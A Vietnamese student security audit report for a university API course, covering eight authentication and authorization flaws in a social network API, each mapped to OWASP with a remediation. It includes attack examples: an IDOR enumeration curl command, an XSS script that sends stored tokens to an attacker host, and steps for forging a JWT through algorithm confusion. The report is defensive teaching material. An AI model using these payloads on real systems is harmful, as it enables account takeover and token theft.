# Báo Cáo Kiểm Toán An Toàn API (Security Audit Report)
## Hệ Thống: Social Network API — Authentication & Authorization
**Học phần:** INT3505E — Thiết kế và Phát triển API  
**Bài tập:** Buổi 06 — Authentication & Authorization  
**Tác giả:** Đoàn Minh Hoàng (no2000gui@gmail.com)  
**Ngày thực hiện:** 27/10/2026  

---

## 1. Giới thiệu tổng quan

Trong kiến trúc dịch vụ mạng xã hội (Social Network API), việc phân định rõ ràng giữa **Authentication (AuthN - Bạn là ai?)** và **Authorization (AuthZ - Bạn được làm gì?)** là phòng tuyến trọng yếu nhất để bảo vệ dữ liệu người dùng.

Tài liệu này thực hiện đánh giá toàn diện các rủi ro bảo mật (Security Audit) đối với 3 endpoint chính:
- `POST /auth/login`: Xác thực thông tin đăng nhập và cấp phát token.
- `POST /auth/refresh`: Cấp mới Access Token bằng Refresh Token (với cơ chế Token Rotation).
- `GET /posts/{id}`: Truy xuất nội dung bài viết với kiểm soát quyền truy cập đa tầng.

Báo cáo phân tích chuyên sâu **8 điểm có thể rò rỉ dữ liệu hoặc bị khai thác** (vượt yêu cầu tối thiểu $\ge 5$ điểm), đối chiếu với danh mục **OWASP API Security Top 10 (2023)** và các nguyên tắc bảo mật từ bài giảng Buổi 06.

---

## 2. Bảng tổng hợp các điểm có thể lộ & mức độ nghiêm trọng

| STT | Điểm lộ / Lỗ hổng bảo mật | Danh mục OWASP | Mức độ nghiêm trọng | Endpoint liên quan |
| :---: | :--- | :--- | :---: | :--- |
| **01** | Broken Object Level Authorization (BOLA/IDOR) lộ bài viết riêng tư | **API1:2023** | 🔴 **CRITICAL** | `GET /posts/{id}` |
| **02** | Rò rỉ thông tin nhạy cảm (Password Hash, Salt) qua Unfiltered DTO | **API3:2023** | 🔴 **CRITICAL** | `GET /posts/{id}` |
| **03** | Rò rỉ danh tính tài khoản qua Thông báo lỗi & Timing Attack (User Enumeration) | **API2:2023** | 🟠 **HIGH** | `POST /auth/login` |
| **04** | Đặt thông tin định danh cá nhân (PII) hoặc Secret vào JWT Payload | **API2:2023** | 🟠 **HIGH** | `POST /auth/login`, `POST /auth/refresh` |
| **05** | Đánh cắp Token qua XSS do lưu trữ trong `localStorage` / `sessionStorage` | **API2:2023** | 🟠 **HIGH** | Phía Client / Web App |
| **06** | Tấn công Replay & Không thu hồi được phiên do thiếu Token Blocklist & RTR | **API2:2023** | 🟠 **HIGH** | `POST /auth/refresh` |
| **07** | Bypass chữ ký JWT qua Algorithm Confusion (HS256 $\leftrightarrow$ RS256) hoặc `alg=none` | **API2:2023** | 🔴 **CRITICAL** | Middleware xác thực JWT |
| **08** | Rò rỉ Secret & Credentials qua URL Query String, Console Log hoặc Git | **API8:2023** | 🟡 **MEDIUM** | Toàn bộ hệ thống |

---

## 3. Phân tích chi tiết 8 điểm có thể lộ & Giải pháp phòng ngừa

---

### Điểm lộ 01: Broken Object Level Authorization (BOLA / IDOR) tại `GET /posts/{id}`

- **Phân loại:** OWASP API1:2023 — Broken Object Level Authorization (Lỗ hổng đứng đầu bảng xếp hạng API).
- **Mức độ rủi ro:** 🔴 **CRITICAL** (Nghiêm trọng).

#### Bối cảnh & Nguyên nhân gốc rễ:
Endpoint `GET /posts/{id}` cho phép người dùng đọc nội dung bài viết. Lập trình viên thường chỉ kiểm tra tầng 1 (AuthN - Token còn hạn) và tầng 2 (Scope - Có scope `posts:read`). Tuy nhiên, trong mạng xã hội có 3 chế độ bài viết:
- `public`: Mọi người đều xem được.
- `private`: Chỉ chính tác giả mới được xem.
- `draft`: Bài nháp chưa công bố.

Nếu máy chủ bỏ qua kiểm tra tầng 3 (**Ownership check: `post.author_id == current_user.id`**), bất kỳ người dùng nào có tài khoản hợp lệ đều có thể duyệt qua tất cả `id` (1, 2, 3...) để đọc trộm nhật ký bí mật, bài viết nháp, hoặc tài liệu mật của người khác.

#### Kịch bản tấn công (Exploit Scenario):
1. Attacker (User ID `42`) đăng nhập hợp lệ và nhận được JWT token có scope `posts:read`.
2. Attacker chạy một script Python tự động tăng ID từ `1` đến `100.000`:
   ```bash
   curl -X GET "https://api.social.net/api/v1/posts/105" \
        -H "Authorization: Bearer <attacker_jwt>"
   ```
3. Bài viết ID `105` là bài viết bí mật (`visibility = 'private'`) của nạn nhân (User ID `99`).
4. Vì API thiếu bước kiểm tra quyền sở hữu đối tượng, server trả về `200 OK` kèm nội dung riêng tư của nạn nhân.

#### Biện pháp khắc phục (Remediation):
1. **Triển khai 3 lớp kiểm tra tuần tự (Slide 24, 25, 26):**
   - Lớp 1 (AuthN): Token hợp lệ, chưa hết hạn, không nằm trong blocklist.
   - Lớp 2 (AuthZ Scope): Kiểm tra token chứa scope `posts:read`.
   - Lớp 3 (Ownership & Access Policy): Nếu `post.visibility != 'public'`, bắt buộc `post.author_id == current_user.id` HOẶC `current_user.has_role('admin')`.
2. **Resource Masking:** Nếu người dùng không có quyền truy cập bài viết riêng tư, API **phải trả về `404 Not Found` thay vì `403 Forbidden`**. Việc trả về 403 sẽ gián tiếp thông báo cho kẻ tấn công biết ID đó có tồn tại bài viết (ID Enumeration).

```python
# Minh họa code phòng chống BOLA chuẩn:
def check_post_access(post, current_user):
    if post.visibility == "public":
        return True
    # Nếu là private hoặc draft, bắt buộc là tác giả hoặc admin
    if current_user and (post.author_id == current_user.id or "admin" in current_user.roles):
        return True
    return False
```

---

### Điểm lộ 02: Rò rỉ thông tin nhạy cảm qua Unfiltered DTO Serialization (Mass Exposure)

- **Phân loại:** OWASP API3:2023 — Broken Object Property Level Authorization.
- **Mức độ rủi ro:** 🔴 **CRITICAL** (Nghiêm trọng).

#### Bối cảnh & Nguyên nhân gốc rễ:
Khi trả về chi tiết bài viết tại `GET /posts/{id}`, API thường đính kèm thông tin tác giả bài viết (`author`). Nhiều lập trình viên sử dụng các hàm tiện ích serialize nguyên bản model ORM hoặc câu truy vấn SQL (như `dict(user)` hoặc `jsonify(post.to_dict())`), vô tình đưa toàn bộ các cột trong bảng cơ sở dữ liệu `users` vào JSON response:
- `password_hash` (chuỗi băm mật khẩu Argon2/bcrypt).
- `salt` (chuỗi muối băm).
- `two_factor_secret` (mã bí mật 2FA TOTP).
- `email`, `phone_number`, `home_address` (thông tin cá nhân nhạy cảm).
- `is_admin`, `internal_notes`.

#### Kịch bản tấn công:
Attacker gọi `GET /posts/101` và nhận được payload:
```json
{
  "id": 101,
  "title": "Chia sẻ kinh nghiệm làm API",
  "author": {
    "id": 1,
    "username": "hoang_dm",
    "email": "hoang@internal.vnu.edu.vn",
    "password_hash": "$2b$12$N9qo8uLOickgx2Z...",
    "phone": "0987654321",
    "is_admin": true
  }
}
```
Kẻ tấn công sao chép chuỗi `password_hash` và dùng các dàn máy GPU phân tán chạy Hashcat để bẻ khóa mật khẩu của Quản trị viên.

#### Biện pháp khắc phục:
1. **Thiết lập Data Transfer Object (DTO) theo cơ chế Whitelist:** Chỉ serialize các thuộc tính được phép công khai:
   ```python
   def serialize_author_dto(user):
       return {
           "id": user.id,
           "username": user.username,
           "name": user.name,
           "avatar_url": user.avatar_url
       }
   ```
2. **Loại trừ vĩnh viễn sensitive fields:** Không bao giờ đưa các trường nhạy cảm vào hàm `__repr__` hoặc hàm serialize mặc định của Entity.

---

### Điểm lộ 03: Rò rỉ danh tính tài khoản qua Thông báo lỗi & Timing Attacks tại `/auth/login`

- **Phân loại:** OWASP API2:2023 — Broken Authentication.
- **Mức độ rủi ro:** 🟠 **HIGH** (Cao).

#### Bối cảnh & Nguyên nhân gốc rễ:
1. **Thông báo lỗi phân biệt (Error Message Discrepancy):** Nếu server trả về `"Email not found"` khi email không tồn tại và trả về `"Wrong password"` khi mật khẩu sai, kẻ tấn công có thể dễ dàng kiểm tra danh sách hàng triệu email để biết ai đã đăng ký dịch vụ (User Enumeration).
2. **Timing Attack:** Các thuật toán băm mật khẩu như Argon2id hoặc bcrypt có độ trễ cố ý (work factor / cost $\approx 200 - 400$ ms). Nếu server kiểm tra:
   ```python
   user = find_by_email(email)
   if not user:
       return "Invalid email", 401 # Phản hồi ngay sau 5ms!
   if not check_password(password, user.hash): # Tốn 300ms!
       return "Invalid password", 401
   ```
   Kẻ tấn công chỉ cần đo thời gian phản hồi (response latency): $\approx 5$ms nghĩa là email chưa đăng ký; $\approx 300$ms nghĩa là email đã tồn tại.

#### Kịch bản tấn công:
Attacker chuẩn bị một từ điển chứa 50.000 email nội bộ của một tổ chức. Bằng cách quan sát thông báo lỗi hoặc biểu đồ thời gian phản hồi (timing graph), attacker xác định được 200 tài khoản thực sự tồn tại. Sau đó tiến hành tấn công Password Spraying (thử các mật khẩu phổ biến như `Pass@123` trên các tài khoản này) mà không bị lộ diện.

#### Biện pháp khắc phục:
1. **Đồng nhất thông báo lỗi:** Luôn trả về thông báo chung: `{"error": "invalid_credentials", "message": "Invalid email or password"}` với HTTP `401 Unauthorized`.
2. **Triển khai Dummy Hash Verification (Constant-Time Response):**
   ```python
   # Khởi tạo một dummy hash cố định khi khởi động ứng dụng
   DUMMY_HASH = ph.hash("dummy_constant_secret_string")

   user = db.query_user_by_email(email)
   if user:
       is_valid = ph.verify(user.pwd_hash, password)
   else:
       # Thực hiện băm giả định để thời gian xử lý luôn tương đương nhau
       try:
           ph.verify(DUMMY_HASH, password)
       except Exception:
           pass
       is_valid = False

   if not is_valid:
       return jsonify(error="invalid_credentials", message="Invalid email or password"), 401
   ```
3. **Áp dụng Rate Limiting:** Giới hạn tối đa 5 lần thử sai trên 1 IP / 1 tài khoản trong vòng 15 phút (trả về `429 Too Many Requests`).

---

### Điểm lộ 04: Đặt thông tin định danh cá nhân (PII) hoặc Secret vào JWT Payload

- **Phân loại:** OWASP API2:2023 — Broken Authentication & Cryptographic Failures.
- **Mức độ rủi ro:** 🟠 **HIGH** (Cao).

#### Bối cảnh & Nguyên nhân gốc rễ (Slide 14 & 18):
Nhiều kỹ sư phát triển phần mềm lầm tưởng rằng JWT là token được "mã hóa" (Encrypted) để bảo mật bí mật. Nhưng thực tế:
- **JWS (JSON Web Signature):** Định dạng thông dụng gồm 3 phần `Header.Payload.Signature`. Phần **Payload chỉ được mã hóa Base64URL**, hoàn toàn là **Plaintext** và bất kỳ ai có token đều giải mã và đọc được ngay lập tức bằng `base64.b64decode` hoặc công cụ trực tuyến như `jwt.io`.
- Nếu đưa các trường như: Số định danh cá nhân (CCCD), Email, Số điện thoại, Địa chỉ, Mã giảm giá, hoặc Secret Key vào JWT payload, kẻ tấn công hoặc bất kỳ proxy trung gian nào đều đọc được toàn bộ.

#### Kịch bản tấn công:
API cấp token với payload chứa:
```json
{
  "sub": 1001,
  "email": "ceo@bigcorp.vn",
  "national_id": "001200001234",
  "phone": "0912345678",
  "is_vip": true
}
```
Kẻ xấu thu thập access token từ lưu lượng mạng hoặc devtools và trích xuất số CCCD và số điện thoại của CEO để đem bán trên chợ đen hoặc phục vụ lừa đảo mạo danh.

#### Biện pháp khắc phục:
1. **Nguyên tắc Minimal Claims:** Chỉ lưu trữ các claims cần thiết nhất cho việc xác thực và phân quyền:
   - `sub`: User ID (số nguyên hoặc UUID).
   - `roles`: Danh sách vai trò vĩ mô (coarse-grained roles, vd: `["user"]`).
   - `scopes`: Danh sách quyền vi mô (fine-grained scopes, vd: `["posts:read"]`).
   - `exp`, `iat`, `jti`: Các claims tiêu chuẩn quản lý vòng đời token.
2. Tuyệt đối không lưu mật khẩu, chuỗi hash, PII hay bí mật kinh doanh vào JWT.

---

### Điểm lộ 05: Đánh cắp Token qua XSS do lưu trữ trong `localStorage` / `sessionStorage`

- **Phân loại:** OWASP API2:2023 — Broken Authentication (Slide 18, Lỗi 05).
- **Mức độ rủi ro:** 🟠 **HIGH** (Cao).

#### Bối cảnh & Nguyên nhân gốc rễ:
Nếu Single Page Application (React / Vue) nhận JWT từ API và lưu vào `localStorage.setItem('access_token', token)` hoặc `sessionStorage`:
- Mọi đoạn mã JavaScript thực thi trên trang đều có quyền truy cập đối tượng `window.localStorage`.
- Nếu trang web tồn tại bất kỳ lỗ hổng XSS nào (ví dụ: hiển thị nội dung bài viết `post.content` chưa qua bộ lọc HTML sanitizer), kẻ tấn công chèn một thẻ `<script>` hoặc `<img src=x onerror=...>`.

#### Kịch bản tấn công:
Attacker đăng một bài viết mạng xã hội chứa payload XSS:
```html
<script>
  fetch('https://evil-hacker.com/steal?t=' + encodeURIComponent(localStorage.getItem('access_token'))
        + '&r=' + encodeURIComponent(localStorage.getItem('refresh_token')));
</script>
```
Bất kỳ người dùng hoặc Quản trị viên nào lướt bảng tin nhìn thấy bài viết này đều bị âm thầm đánh cắp toàn bộ cặp token về máy chủ của kẻ tấn công mà không hề hay biết.

#### Biện pháp khắc phục:
1. **Lưu trữ Refresh Token trong `HttpOnly`, `Secure`, `SameSite=Strict` Cookie:**
   - Cờ `HttpOnly` ngăn chặn hoàn toàn việc JavaScript đọc cookie qua `document.cookie`.
   - Cờ `Secure` đảm bảo cookie chỉ được gửi qua kết nối mã hóa HTTPS.
   - Cờ `SameSite=Strict` hoặc `Lax` chống tấn công Cross-Site Request Forgery (CSRF).
2. **Access Token chỉ lưu trong In-Memory:** Lưu trong biến JavaScript của ứng dụng (trong bộ nhớ RAM của closure), token sẽ tự mất khi đóng tab hoặc tải lại trang, và được khôi phục tự động qua endpoint `/auth/refresh` sử dụng HttpOnly Cookie.

---

### Điểm lộ 06: Tấn công Replay & Thiếu Cơ Chế Thu Hồi Phiên (Broken Token Revocation)

- **Phân loại:** OWASP API2:2023 — Broken Authentication (Slide 13, 15, 17, 20).
- **Mức độ rủi ro:** 🟠 **HIGH** (Cao).

#### Bối cảnh & Nguyên nhân gốc rễ:
Bản chất của JWT là **Stateless** — máy chủ xác minh tính hợp lệ bằng chữ ký số mà không cần truy vấn CSDL. Điều này dẫn đến lỗ hổng:
- Khi người dùng bấm **Logout**, nếu máy chủ không có danh sách thu hồi (Token Revocation Blocklist), token cũ vẫn hoàn toàn hợp lệ cho đến khi hết hạn `exp`.
- Nếu Refresh Token có thời hạn 30 ngày bị kẻ tấn công chụp lén (sniffing / malware), kẻ tấn công có thể liên tục gọi `/auth/refresh` để duy trì quyền truy cập vĩnh viễn dù nạn nhân đã đổi mật khẩu.

#### Kịch bản tấn công:
Nạn nhân truy cập mạng xã hội tại máy tính thư viện. Trước khi về, nạn nhân bấm "Đăng xuất". Kẻ tấn công mở lại trình duyệt hoặc lấy chuỗi token đã lưu lại trong cache/history và tiếp tục gửi request đến `/posts/1` hoặc `/auth/refresh`. Server thấy chữ ký còn đúng và `exp` chưa quá hạn nên vẫn chấp thuận cho kẻ tấn công thực hiện mọi quyền hạn.

#### Biện pháp khắc phục:
1. **Triển khai Token Blocklist với Redis / Database (Slide 15, 17):**
   Mỗi JWT khi phát hành được gắn một mã định danh duy nhất `jti` (JWT ID - UUID). Khi logout, ghi `jti` vào Redis với thời gian sống (TTL) bằng thời gian còn lại của token. Middleware `@jwt.token_in_blocklist_loader` sẽ từ chối ngay lập tức nếu `jti` nằm trong blocklist:
   ```python
   @jwt.token_in_blocklist_loader
   def check_if_token_revoked(jwt_header, jwt_payload):
       jti = jwt_payload["jti"]
       return db.session.query(RevokedToken.id).filter_by(jti=jti).scalar() is not None
   ```
2. **Triển khai Refresh Token Rotation (RTR - Slide 20, 21):**
   - Mỗi lần refresh, refresh token cũ bị hủy ngay và cấp một token mới.
   - **Phát hiện tái sử dụng (Token Reuse Detection):** Nếu hệ thống nhận được một refresh token đã từng bị thu hồi/đã dùng, lập tức nhận diện nguy cơ rò rỉ token và **thu hồi toàn bộ các phiên hoạt động (Token Family Revocation)** của người dùng đó.

---

### Điểm lộ 07: Tấn công Algorithm Confusion & Chấp nhận `alg=none` (JWT Signature Bypass)

- **Phân loại:** OWASP API2:2023 — Cryptographic Failures (Slide 18, Lỗi 01 & 02).
- **Mức độ rủi ro:** 🔴 **CRITICAL** (Nghiêm trọng).

#### Bối cảnh & Nguyên nhân gốc rễ:
1. **Lỗ hổng `alg=none`:** Chuẩn JWT cho phép thuật toán không có chữ ký (`"alg": "none"`). Một số thư viện kiểm tra lỏng lẻo nếu thấy `alg=none` sẽ bỏ qua bước verify chữ ký.
2. **Lỗ hổng Algorithm Confusion (HS256 $\leftrightarrow$ RS256):**
   - Hệ thống dự kiến dùng khóa bất đối xứng RSA (`RS256`), máy chủ công khai Public Key để các dịch vụ khác xác minh token.
   - Kẻ tấn công tạo một token giả mạo, sửa header thành `{"alg": "HS256"}` (thuật toán khóa đối xứng HMAC).
   - Kẻ tấn công dùng chính chuỗi **Public Key công khai của server** làm HMAC secret key để ký token.
   - Khi server nhận token, nếu thư viện verify không ép chặt thuật toán, server lấy Public Key ra để verify theo thuật toán `HS256` mà token yêu cầu. Phép toán toán học khớp hoàn toàn $\rightarrow$ Server công nhận token giả mạo với bất kỳ quyền hạn nào (`roles: ["admin"]`).

#### Kịch bản tấn công:
Attacker lấy file public key `public.pem` của hệ thống mạng xã hội, chế tạo một token:
- Header: `{"alg": "HS256", "typ": "JWT"}`
- Payload: `{"sub": "999", "roles": ["admin"], "scopes": ["posts:read", "posts:write", "admin:all"]}`
- Ký bằng `HMACSHA256(payload, public_pem_content)`.
Gửi token lên `GET /posts/1`, server bị bypass và trao toàn quyền quản trị cho kẻ tấn công.

#### Biện pháp khắc phục:
1. **Cấu hình Allowlist thuật toán tường minh (Slide 18):**
   Cấm tiệt đối việc tin tưởng thuật toán do token tự khai báo trong header:
   ```python
   # Cấu hình cứng thuật toán trong Flask app
   app.config["JWT_ALGORITHM"] = "HS256"
   app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"] # Chỉ cho phép HS256, cấm none và RS*
   ```
2. Phân tách rạch ròi bí mật đối xứng và cặp khóa bất đối xứng. Secret key cho HMAC phải đủ độ dài ngẫu nhiên tối thiểu 256-bit (32 bytes ngẫu nhiên).

---

### Điểm lộ 08: Rò rỉ Secret & Credentials qua URL Query String, Console Log hoặc Git

- **Phân loại:** OWASP API8:2023 — Security Misconfiguration & Secret Exposure (Slide 3, 6, 9).
- **Mức độ rủi ro:** 🟡 **MEDIUM** (Trung bình đến Cao).

#### Bối cảnh & Nguyên nhân gốc rễ:
1. **Truyền token qua URL Query String (`?access_token=...`):**
   - URL đầy đủ thường bị lưu trữ vĩnh viễn trong: Web server access log (Nginx, Cloudflare), lịch sử trình duyệt người dùng, và header `Referer` khi người dùng bấm vào liên kết ngoài dẫn tới website khác.
2. **Hardcode Secret vào Git Repository (Slide 3, Case 3):**
   - `FLASK_SECRET_KEY` hoặc `JWT_SECRET_KEY` bị hardcode trực tiếp trong mã nguồn rồi `git push` lên GitHub công khai.
3. **Log Credential / Password / Token vào Console / Log File:**
   - Dùng lệnh `print(request.json)` hoặc ghi debug log toàn bộ request body tại endpoint `/auth/login`, khiến mật khẩu dạng plain text bị lưu vào file log hệ thống.

#### Kịch bản tấn công:
Người dùng click vào liên kết hình ảnh bên ngoài được chia sẻ trên mạng xã hội. Trình duyệt gửi header `Referer: https://social.net/api/v1/posts/101?token=eyJhbG...` sang server của kẻ tấn công. Kẻ tấn công đọc nhật ký log máy chủ của mình và lấy được token của người dùng.

#### Biện pháp khắc phục:
1. **Không truyền token qua Query String:** Bắt buộc truyền qua header chuẩn `Authorization: Bearer <token>`.
2. **Quản lý Secrets bằng biến môi trường:** Dùng `.env` và đưa vào `.gitignore`. Cung cấp key an toàn qua Secret Manager (AWS Secrets Manager, Vault, etc.):
   ```python
   JWT_SECRET_KEY = os.environ.get("JWT_SECRET_KEY")
   if not JWT_SECRET_KEY or len(JWT_SECRET_KEY) < 32:
       raise ValueError("Insecure JWT_SECRET_KEY configuration!")
   ```
3. **Sanitize Log Data:** Cấu hình bộ lọc log (Log Redactor) tự động ẩn các trường nhạy cảm (`password`, `access_token`, `refresh_token`, `Authorization`).

---

## 4. Kế hoạch hành động & Danh mục kiểm thử bảo mật (Security Checklist)

Để đảm bảo hệ thống Social Network API an toàn trước khi triển khai (Production Readiness Checklist theo Slide 29):

- [x] **Phân loại Endpoint:**
  - `POST /auth/login`: Public (Không yêu cầu token).
  - `POST /auth/refresh`: Protected (Chỉ chấp nhận Refresh Token hợp lệ).
  - `GET /posts/{id}`: Protected (Yêu cầu Access Token có scope `posts:read`).
- [x] **Xác thực mật khẩu hiện đại:** Sử dụng thuật toán băm Argon2id (hoặc bcrypt cost $\ge 12$), có salt ngẫu nhiên riêng biệt cho từng bản ghi.
- [x] **Bảo vệ chống BOLA:** Triển khai hàm kiểm tra quyền truy cập 3 lớp; ẩn bài viết riêng tư bằng mã lỗi `404 Not Found`.
- [x] **Bảo vệ DTO (Anti-Mass Assignment):** Thiết kế schema DTO tường minh, không trả về `password_hash` hay dữ liệu thô từ cơ sở dữ liệu.
- [x] **Quản lý phiên & Thu hồi:** Triển khai cơ chế Refresh Token Rotation (RTR) và Token Blocklist lưu `jti`.
- [x] **Chống Enumeration & Timing Attacks:** Chuẩn hóa mã lỗi `401 invalid_credentials` và xử lý thời gian không chênh lệch.
- [x] **Bảo vệ Chữ ký JWT:** Cấu hình allowlist thuật toán cố định `HS256`, cấm `alg=none`, secret $\ge 256$-bit.
- [x] **Giới hạn tần suất (Rate Limiting):** Áp dụng rate limit trên các endpoint nhạy cảm (đăng nhập và làm mới token).

---

## 5. Kết luận

Báo cáo kiểm toán an toàn trên đã xác định đầy đủ các rủi ro cốt lõi của hệ thống Social Network API và đề xuất giải pháp kỹ thuật cụ thể bám sát nội dung bài giảng Buổi 06. Việc kết hợp chặt chẽ giữa đặc tả **OpenAPI 3.1.0** chuẩn mực và các biện pháp phòng vệ nhiều lớp (Defense-in-Depth) đảm bảo API vận hành an toàn, tin cậy và tuân thủ các tiêu chuẩn công nghiệp hiện đại.
